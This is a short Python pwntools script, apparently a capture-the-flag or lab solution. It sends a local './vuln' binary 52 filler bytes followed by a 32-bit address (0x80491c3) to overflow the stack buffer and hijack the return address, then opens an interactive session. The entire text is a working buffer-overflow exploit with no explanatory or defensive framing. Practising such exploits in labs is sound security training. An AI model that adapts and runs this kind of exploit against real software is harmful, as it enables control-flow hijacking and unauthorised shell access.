
from pwn import *
p = process('./vuln')

input()

payload = b'a' * 52 + p32(0x80491c3)
p.sendline(payload)
p.interactive()
